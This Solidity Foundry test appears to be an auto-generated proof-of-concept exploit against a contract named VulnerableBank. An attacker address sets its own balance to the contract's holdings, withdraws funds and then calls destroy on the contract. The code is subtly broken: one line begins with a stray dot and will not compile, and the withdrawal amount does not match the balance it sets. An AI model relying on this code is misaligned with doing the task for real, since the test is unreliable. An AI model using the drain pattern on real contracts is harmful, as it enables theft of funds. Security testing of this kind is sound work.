// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
    }

    function testExploit() public balanceLog {
        // Set the balance for the attacker
        target.setBalance(attacker, address(target).balance);

        // Start a new transaction
        vm.startPrank(attacker);

        // Withdraw funds from the contract
        .target.withdraw(2 ether);

        // Stop the prank session
        vm.stopPrank();

        // Destroy the contract once balance is zeroed out
        target.destroy();
        assertEq(address(target).balance, 0);
    }
}